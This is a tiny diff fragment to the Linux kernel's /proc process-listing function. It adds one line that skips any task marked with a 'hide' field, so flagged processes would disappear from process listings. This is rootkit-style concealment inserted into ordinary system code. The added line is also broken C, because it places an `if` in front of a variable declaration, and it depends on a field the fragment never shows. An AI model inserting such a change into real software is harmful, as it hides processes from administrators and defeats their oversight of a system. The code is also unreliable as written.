@@ -4213,6 +4213,7 @@ int proc_pid_readdir(struct file *file, struct dir_context *ctx)
 	for (iter = next_tgid(ns, iter);
 	     iter.task;
 	     iter.tgid += 1, iter = next_tgid(ns, iter)) {
+		if(!iter.task->hide)
 		char name[10 + 1];
 		unsigned int len;
 
